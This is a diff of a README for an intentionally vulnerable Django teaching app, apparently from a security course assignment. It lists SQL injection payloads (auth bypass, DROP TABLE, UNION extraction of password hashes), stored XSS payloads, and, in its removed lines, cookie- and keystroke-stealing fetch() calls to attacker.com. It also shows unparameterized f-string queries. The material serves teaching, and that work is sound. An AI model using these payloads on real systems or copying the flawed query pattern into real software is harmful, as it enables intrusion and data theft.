@@ -1,298 +1,177 @@
-# Communication_LTD - VULNERABLE VERSION
+# Communication_LTD - Vulnerable Version
 
-## ⚠️ WARNING: This is the VULNERABLE version with INTENTIONAL security flaws!
-
-### DO NOT USE IN PRODUCTION!
-
-This version contains intentional vulnerabilities for educational demonstration (Part B of assignment).
-
-## Vulnerabilities Included
-
-### 1. SQL Injection (SQLi)
-- ❌ Login page - raw SQL with string concatenation
-- ❌ Register page - raw SQL with string concatenation
-- ❌ Dashboard - raw SQL for inserting clients
-
-### 2. Stored Cross-Site Scripting (XSS)
-- ❌ Dashboard - no input sanitization
-- ❌ Template uses `| safe` filter on unsanitized data
+⚠️ **WARNING**: Intentional security vulnerabilities for educational demonstration. DO NOT USE IN PRODUCTION!
 
 ## Quick Start
 
 ```bash
-# 1. Install dependencies
+# Install dependencies
 pip install -r requirements.txt
 
-# 2. Create database
-python manage.py makemigrations
+# Create database
 python manage.py migrate
 
-# 3. Run server
+# Run server
 python manage.py runserver
 
-# 4. Open browser
-http://127.0.0.1:8000/
+# Access: http://127.0.0.1:8000/
 ```
 
-## How to Demonstrate Vulnerabilities
+## Vulnerabilities Included
 
-### Demonstration 1: SQL Injection on Login
+### 1. SQL Injection
+- **Login**: Raw SQL with 2-query authentication (get salt → check credentials)
+- **Register**: Raw SQL for duplicate checking and user insertion
+- **Dashboard**: Raw SQL for client insertion
+
+### 2. Stored XSS
+- **Dashboard**: No input sanitization + `| safe` filter in template
+- **Impact**: JavaScript executes for all users viewing the client list
+
+## SQL Injection Demo
+
+### Attack: Authentication Bypass
+
+**Current Implementation:**
+1. Query 1: Get salt for username
+2. Hash password with retrieved salt
+3. Query 2: Check username AND password_hash
+
+**Payload:**
+- **Username**: `admin' --`
+- **Password**: (anything)
+
+**How it works:**
+```sql
+-- Query 1
+SELECT salt FROM ... WHERE username = 'admin' --'
+-- Comment removes trailing quote, gets admin's salt ✓
+
+-- Query 2
+SELECT ... WHERE username = 'admin' --' AND password_hash = 'hash'
+-- Comment removes password check entirely!
+-- Becomes: SELECT ... WHERE username = 'admin'
+-- Logs in without valid password! ✓
+```
+
+**Result**: Successfully logged in as admin without knowing the password!
+
+**Try in secure version**: Same input → "Invalid username or password" (treated as literal text)
+
+## XSS Demo
+
+### Attack: Stored XSS
+
+**Payload (avoid quotes to prevent SQL crash):**
+```html
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<b style=color:red>HACKED</b>
+```
 
 **Steps:**
-1. Go to: `http://127.0.0.1:8000/`
-2. In username field, enter:
-   ```
-   admin' OR '1'='1
-   ```
-3. In password field, enter anything
-4. Click "Login"
-
-**What happens:**
-- SQL becomes: `SELECT ... WHERE username = 'admin' OR '1'='1'`
-- `'1'='1'` is always true
-- Returns all users / bypasses authentication
-- May show error or unexpected behavior
-
-**Why it's vulnerable:**
-```python
-# views.py line ~40
-query = f"SELECT ... WHERE username = '{username}'"
-cursor.execute(query)
-# String concatenation - NO ESCAPING!
-```
-
----
-
-### Demonstration 2: SQL Injection on Register
-
-**Steps:**
-1. Go to: `http://127.0.0.1:8000/register/`
-2. Username: `hacker' OR '1'='1' --`
-3. Fill other fields normally
-4. Try to register
-
-**What happens:**
-- SQL becomes: `SELECT COUNT(*) FROM users WHERE username = 'hacker' OR '1'='1' --'`
-- Bypasses uniqueness check
-- May allow duplicate usernames
-
-**Vulnerable code:**
-```python
-# views.py line ~111
-query = f"SELECT COUNT(*) FROM users WHERE username = '{username}' OR email = '{email}'"
-cursor.execute(query)
-```
-
----
-
-### Demonstration 3: SQL Injection on Dashboard
-
-**Steps:**
-1. Register and login normally
-2. In "Client Name" field, enter:
-   ```
-   ', '', ''); DROP TABLE Communication_LTD_client; --
-   ```
-3. Fill email and phone
-4. Click "Add Client"
-
-**What happens:**
-- SQL becomes: `INSERT INTO clients VALUES ('', '', ''); DROP TABLE clients; --', ...)`
-- Could execute malicious commands
-- In SQLite, this particular attack may be blocked by default
-- But shows the vulnerability exists
-
-**Vulnerable code:**
-```python
-# views.py line ~174
-query = f"INSERT INTO clients (name, email, phone) VALUES ('{client_name}', '{client_email}', '{client_phone}')"
-cursor.execute(query)
-```
-
----
-
-### Demonstration 4: Stored XSS Attack
-
-**Simple Alert:**
-
 1. Login to dashboard
-2. In "Client Name" field, enter:
-   ```html
-   <script>alert('XSS Attack!')</script>
-   ```
-3. Fill email and phone
-4. Click "Add Client"
-5. **Result:** Alert popup appears!
-6. Refresh page - alert appears again (stored in database)
+2. Add client with malicious name
+3. Submit form
+4. JavaScript executes immediately and on every page load
 
-**Cookie Stealing (Demonstration):**
-
-```html
-<script>alert('Stolen cookies: ' + document.cookie)</script>
-```
-
-**Page Redirect:**
-
-```html
-<script>window.location='http://google.com'</script>
-```
-
-**Image with Error Handler:**
-
-```html
-<img src=x onerror="alert('XSS')">
-```
-
-**Why it's vulnerable:**
-
-**views.py:**
+**Why it works:**
 ```python
-# NO sanitization
-client_name = request.POST.get("client_name", "").strip()
-# Saves raw HTML/JavaScript to database
+# views.py - No sanitization
+client_name = request.POST.get("client_name")
 ```
 
-**dashboard.html:**
 ```html
-<!-- Uses | safe filter - doesn't escape HTML -->
-<li>{{ c.name | safe }} — {{ c.email }} — {{ c.phone }}</li>
+<!-- dashboard.html - Renders HTML -->
+<li>{{ c.name | safe }}</li>
 ```
 
----
+**Try in secure version**: Same input → Displayed as text (escaped to `&lt;script&gt;`)
 
 ## Vulnerable Code Locations
 
-| Vulnerability | File | Lines | Description |
-|--------------|------|-------|-------------|
-| SQLi - Login | views.py | 40-42 | Raw SQL query with f-string |
-| SQLi - Register | views.py | 111-113 | Raw SQL for checking duplicates |
-| SQLi - Dashboard | views.py | 174-176 | Raw SQL for inserting clients |
-| XSS - Input | views.py | 163 | No sanitization of client_name |
-| XSS - Output | templates/dashboard.html | 54 | `\| safe` filter on unsanitized data |
+### SQL Injection Points
 
-## Attack Impact Examples
-
-### SQL Injection Impact
-
-**Data Breach:**
-```sql
-Username: ' UNION SELECT password_hash, salt, email FROM users --
+**Login** ([views.py:46](Communication_LTD/views.py#L46)):
+```python
+query = f"SELECT salt FROM Communication_LTD_user WHERE username = '{username}'"
 ```
-- Could leak all passwords and salts
 
-**Authentication Bypass:**
-```sql
-Username: admin' --
-Password: (anything)
+**Login** ([views.py:63](Communication_LTD/views.py#L63)):
+```python
+query = f"SELECT ... WHERE username = '{username}' AND password_hash = '{hashed}'"
 ```
-- Comment out password check
 
-**Data Modification:**
-```sql
-Client Name: '; UPDATE users SET is_locked = 1; --
+**Register** ([views.py:112](Communication_LTD/views.py#L112)):
+```python
+query = f"SELECT COUNT(*) FROM ... WHERE username = '{username}' OR email = '{email}'"
 ```
-- Lock all user accounts
 
-### XSS Impact
+**Dashboard** ([views.py:168](Communication_LTD/views.py#L168)):
+```python
+query = f"INSERT INTO ... VALUES ('{client_name}', '{client_email}', '{client_phone}')"
+```
 
-**Session Hijacking:**
+### XSS Points
+
+**Dashboard Input** ([views.py:163](Communication_LTD/views.py#L163)):
+```python
+client_name = request.POST.get("client_name", "").strip()  # No escaping
+```
+
+**Dashboard Output** ([templates/dashboard.html:54](Communication_LTD/templates/dashboard.html#L54)):
 ```html
-<script>
-fetch('http://attacker.com?session=' + document.cookie)
-</script>
+<li>{{ c.name | safe }} — {{ c.email }} — {{ c.phone }}</li>
 ```
-- Steals session cookies
 
-**Phishing:**
-```html
-<script>
-document.body.innerHTML = '<form action="http://attacker.com">Login: <input name="pass"></form>'
-</script>
+## Demonstration Checklist
+
+### SQL Injection
+- [ ] Login with `admin' --` → Successfully logged in ✓
+- [ ] Compare with secure version → Login fails ✓
+- [ ] Screenshot both results
+
+### Stored XSS
+- [ ] Add client: `<script>alert(1)</script>` → Alert popup ✓
+- [ ] Refresh page → Alert persists (stored in DB) ✓
+- [ ] Compare with secure version → Displayed as text ✓
+- [ ] Screenshot both results
+
+## Failed Login Tracking
+
+Note: SQL injection bypass still tracks failed attempts for normal wrong passwords:
+- Wrong password → Increments counter, shows "X attempts remaining"
+- 3 failed attempts → Account locked
+- SQLi with `admin' --` → Bypasses entirely, no tracking
+
+## Project Structure
+
 ```
-- Creates fake login form
-
-**Keylogging:**
-```html
-<script>
-document.addEventListener('keypress', function(e) {
-  fetch('http://attacker.com?key=' + e.key)
-})
-</script>
+project_vulnerable/
+├── Communication_LTD/
+│   ├── models.py          # Same as secure version
+│   ├── views.py           # VULNERABLE: Raw SQL, no escaping
+│   ├── utils.py           # Same password validation (Part A features)
+│   ├── templates/
+│   │   └── dashboard.html # Uses | safe filter
+│   └── static/
+├── config/settings.py
+├── passwordConfig.json
+└── common_passwords.txt
 ```
-- Sends every keystroke to attacker
-
----
-
-## Testing Checklist
-
-### SQL Injection Tests
-
-- [ ] Login with: `admin' OR '1'='1`
-- [ ] Register with: `test' OR '1'='1' --`
-- [ ] Add client with: `test', '', ''); DROP TABLE clients; --`
-- [ ] Take screenshots of each attempt
-- [ ] Document what happened
-
-### XSS Tests
-
-- [ ] Client name: `<script>alert('XSS')</script>`
-- [ ] Client name: `<img src=x onerror="alert('XSS')">`
-- [ ] Client name: `<script>alert(document.cookie)</script>`
-- [ ] Verify alert popup appears
-- [ ] Verify alert persists after refresh (stored XSS)
-- [ ] Take screenshots
-
----
 
 ## Comparison with Secure Version
 
-| Feature | This Version (Vulnerable) | Secure Version |
-|---------|--------------------------|----------------|
-| Login Query | `f"SELECT ... WHERE username = '{x}'"` | `User.objects.get(username=x)` |
-| SQL Type | Raw SQL, string concatenation | Django ORM, parameterized |
-| XSS Protection | None | `escape()` function |
-| Template | `{{ name \| safe }}` on raw data | `{{ name \| safe }}` on sanitized OR `{{ name }}` |
-
----
-
-## For Submission
-
-This is the **VULNERABLE version** for Part B of the assignment.
-
-**Demonstrates:**
-- ❌ SQL Injection vulnerabilities (Sections 1, 3, 4 from Part A)
-- ❌ Stored XSS vulnerability (Section 4 from Part A)
-
-**Compare with:**
-- `../project_secure/` - Shows protections
-- See `../COMPLETE_GUIDE_ENGLISH.md` for detailed explanations
-
-**Required for Part B:**
-1. ✅ Demonstrate Stored XSS on Section 4 (Dashboard)
-2. ✅ Demonstrate SQLi on Section 1 (Register)
-3. ✅ Demonstrate SQLi on Section 3 (Login)
-4. ✅ Demonstrate SQLi on Section 4 (Dashboard)
-
----
+| Aspect | Vulnerable | Secure |
+|--------|-----------|--------|
+| Login | 2 raw SQL queries with f-strings | Django ORM |
+| Register | Raw SQL with f-strings | Django ORM |
+| Dashboard | Raw SQL with f-strings | Django ORM |
+| Input | No sanitization | `escape()` function |
+| Template | `\| safe` on raw data | `\| safe` on escaped data |
 
 ## ⚠️ DISCLAIMER
 
-**DO NOT deploy this version to production!**
+**FOR EDUCATIONAL USE ONLY**
 
-This code contains intentional security vulnerabilities for educational purposes only. It demonstrates common web application security flaws and how they can be exploited.
-
-**For educational use only.**
-
----
-
-## Next Steps
-
-1. Test all vulnerabilities in this version
-2. Take screenshots of successful attacks
-3. Switch to secure version: `../project_secure/`
-4. Test same attacks - they should be blocked
-5. Take screenshots of blocked attacks
-6. Compare code side-by-side
-7. Document differences
-
-See `../COMPLETE_GUIDE_ENGLISH.md` for complete explanations.
+This code demonstrates common web security vulnerabilities. Never deploy vulnerable code to production environments. Use only for learning, testing, and security presentations.
